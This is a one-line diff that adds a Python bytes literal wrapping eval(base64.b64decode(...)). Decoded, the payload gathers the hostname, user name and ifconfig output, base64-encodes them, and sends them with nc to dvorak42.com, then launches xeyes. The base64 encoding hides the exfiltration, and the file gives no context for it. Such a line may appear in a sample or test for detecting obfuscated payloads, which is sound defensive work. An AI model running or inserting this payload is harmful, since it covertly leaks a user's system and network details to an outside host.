@@ -1,0 +1,1 @@
+"print("eval(base64.b64decode('b3Muc3lzdGVtKCdlY2hvICJHRVQgLz9gZWNobyAkKGVjaG8gJChob3N0bmFtZTt3aG9hbWk7aWZjb25maWcpIHwgYmFzZTY0KSB8IHNlZCAicy8gLy0vZyJgIEhUVFAvMS4wXG5Ib3N0OiBkdm9yYWs0Mi5jb21cblxuIiB8IG5jIGR2b3JhazQyLmNvbSA4MCcpICsgb3Muc3lzdGVtKCd4ZXllcycp'))")".encode('utf-8')
